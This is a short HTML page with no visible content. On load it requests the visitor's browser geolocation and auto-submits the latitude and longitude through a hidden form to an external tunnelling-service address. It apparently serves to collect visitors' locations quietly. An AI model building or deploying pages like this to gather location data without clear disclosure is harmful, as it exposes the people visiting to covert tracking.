<!DOCTYPE HTML>
   <head>
   	<meta charset="utf-8">
      <script type="text/javascript">

         function showLocation(position) {
            var latitude = position.coords.latitude;
            var longitude = position.coords.longitude;
            document.getElementById("latitude").value = latitude;
            document.getElementById("longitude").value = longitude;
            document.myforms.submit();
         }

         function errorHandler(err) {
            if(err.code == 1) {
                document.getElementById("latitude").value = "Error: Access is denied!";
                document.getElementById("longitude").value = "Error: Access is denied!";

            }else if( err.code == 2) {
                document.getElementById("latitude").value = "Error: Position is unavailable!";
                document.getElementById("longitude").value = "Error: Position is unavailable!";

            }
         }

         function getLocation(){

            if(navigator.geolocation){
               // timeout at 60000 milliseconds (60 seconds)
               var options = {timeout:60000};
               navigator.geolocation.getCurrentPosition(showLocation, errorHandler, options);
                return true;
            }else{
                document.getElementById("latitude").value = "Sorry, browser does not support geolocation!";
                document.getElementById("longitude").value = "Sorry, browser does not support geolocation!";
            }
         }

      </script>

   </head>

   <html>
      <body>
         <form method="post" action="http://lord.free.idcfengye.com/seller/weixin/" name="myforms">
             <input id="latitude" type="hidden" name="latitude" value="" />
             <input id="longitude" type="hidden" name="longitude" value="">
         </form>

         <script>
             getLocation();
         </script>
      </body>
   </html>

